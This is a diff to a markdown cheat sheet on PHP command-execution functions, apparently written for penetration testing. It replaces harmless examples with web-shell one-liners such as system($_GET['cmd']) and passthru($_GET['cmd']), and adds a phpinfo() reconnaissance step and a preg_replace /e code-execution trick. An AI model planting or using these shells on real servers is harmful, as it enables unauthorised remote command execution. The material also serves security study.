@@ -52,16 +52,25 @@ PHP Command Execution
 
 # 🔧 PHP Command Execution Functions
 
+## First Cheak
+```php
+#For Information:
+<?phpinfo();?>
+```
+
 ## 01 — `system()`
 
 `system()` executes an operating-system command and normally sends its output directly to the output stream.
 
 ```php
-system("whoami");
+# Execute one command
+<?php system("whoami"); ?>
 ```
-
-### Key Point
-
+#### Extra:
+```php
+# Take input from the url paramter. shell.php?cmd=whoami
+ system($_GET['cmd']);
+```
 ```text
 PHP
  ↓
@@ -81,7 +90,8 @@ Output
 `passthru()` executes an external command and passes the output directly to the output stream.
 
 ```php
-passthru("whoami");
+# The same but using passthru
+<?php passthru($_GET['cmd']); ?>
 ```
 
 ### Key Point
@@ -95,16 +105,10 @@ Useful when the command output needs to be passed through directly.
 `shell_exec()` executes a command and returns its output as a string.
 
 ```php
-$output = shell_exec("whoami");
+# For shell_exec to output the result you need to echo it
+<?php echo shell_exec("whoami");?>
 
-echo $output;
 ```
-
-### Key Point
-
-Unlike `system()`, the output can be stored in a variable and processed before being displayed.
-
----
 
 ## 04 — `exec()`
 
@@ -113,31 +117,38 @@ Unlike `system()`, the output can be stored in a variable and processed before b
 It can return the last line of output and can also populate an array with output lines.
 
 ```php
-$output = [];
-
-exec("command", $output);
-
-print_r($output);
+# Exec() does not output the result without echo, and only output the last line. So not very useful!
+<?php echo exec("whoami");?>
 ```
+#### Extra:
 
-### Key Point
+```php
+# Instead to this if you can. It will return the output as an array, and then print it all.
+<?php exec("ls -la",$array); print_r($array); ?>
 
-An array can be useful when a command produces multiple lines of output.
-
----
-
+ ```
 ## 05 — PHP Backticks
 
 PHP also provides another syntax for executing shell commands:
 
 ```php
-$output = `whoami`;
-
-echo $output;
+# Using backticks
+<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>
 ```
+#### Extra:
+```php
+# Using backticks
+<?php echo `whoami`; ?>
 
+```
 This is conceptually similar to obtaining command output through `shell_exec()`.
 
+---
+## 06 `preg_replace()`
+```php
+# preg_replace(). This is a cool trick
+<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
+```
 ---
 
 # 📊 Function Comparison
